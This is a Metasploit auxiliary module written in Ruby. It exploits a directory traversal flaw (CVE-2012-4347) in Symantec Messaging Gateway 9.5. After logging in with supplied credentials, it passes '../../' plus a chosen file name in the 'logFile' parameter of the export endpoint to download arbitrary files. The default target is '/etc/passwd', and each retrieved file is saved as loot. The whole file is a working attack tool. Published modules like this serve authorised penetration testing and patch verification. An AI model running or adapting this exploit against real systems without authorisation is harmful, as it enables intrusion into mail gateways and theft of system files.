##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',
      'Description'    => %q{
          This module will download a file of your choice against Symantec Messaging
        Gateway.  This is possible by exploiting a directory traversal vulnerability
        when handling the 'logFile' parameter, which will load an arbitrary file as
        an attachment.  Note that authentication is required in order to successfully
        download your file.
      },
      'References'     =>
        [
          ['CVE', '2012-4347'],
          ['EDB', '23110'],
          ['OSVDB', '88165'],
          ['BID', '56789'],
          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120827_00']
        ],
      'Author'         =>
        [
          'Ben Williams <ben.williams[at]ngssecure.com>',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Nov 30 2012"
    ))

    register_options(
      [
        Opt::RPORT(41080),
        OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),
        OptString.new('USERNAME', [true, 'The username to login as']),
        OptString.new('PASSWORD', [true, 'The password to login with'])
      ], self.class)

    deregister_options('RHOST')
  end

  def auth(username, password, sid, last_login)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => '/brightmail/login.do',
      'headers'   => {
        'Referer' => "http://#{peer}/brightmail/viewLogin.do"
      },
      'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
      'vars_post' => {
        'lastlogin'  => last_login,
        'userLocale' => '',
        'lang'       => 'en_US',
        'username'   => username,
        'password'   => password,
        'loginBtn'   => 'Login'
      }
    })

    if res and res.headers['Location']
      new_uri = res.headers['Location'].scan(/^http:\/\/[\d\.]+:\d+(\/.+)/).flatten[0]
      res = send_request_cgi({
        'uri'    => new_uri,
        'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}"
      })

      return true if res and res.body =~ /Logged in as: #{username}/
    end

    return false
  end


  def get_login_data
    sid        = ''  #From cookie
    last_login = ''  #A hidden field in the login page

    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})
    if res and res.headers['Set-Cookie']
      sid = res.headers['Set-Cookie'].scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
    end

    if res
      last_login = res.body.scan(/<input type="hidden" name="lastlogin" value="(.+)"\/>/).flatten[0] || ''
    end

    return sid, last_login
  end


  def download_file(sid, fname)
    res = send_request_cgi({
      'uri'      => '/brightmail/export',
      'cookie'   => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
      'vars_get' => {
        'type'        => 'logs',
        'logFile'     => "../../#{fname}",
        'logType'     => '1',
        'browserType' => '1'
      }
    })

    if not res
      print_error("#{peer} - Unable to download the file. The server timed out.")
      return
    elsif res and res.body.empty?
      print_error("#{peer} - File not found or empty.")
      return
    end

    vprint_line("")
    vprint_line(res.body)

    f = ::File.basename(fname)
    p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)
    print_good("#{peer} - File saved as: '#{p}'")
  end


  def run_host(ip)
    sid, last_login = get_login_data
    if sid.empty? or last_login.empty?
      print_error("#{peer} - Missing required login data.  Cannot continue.")
      return
    end

    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    if not auth(username, password, sid, last_login)
      print_error("#{peer} - Unable to login.  Cannot continue.")
      return
    else
      print_good("#{peer} - Logged in as '#{username}:#{password}'")
    end

    fname = datastore['FILENAME']
    download_file(sid, fname)
  end

end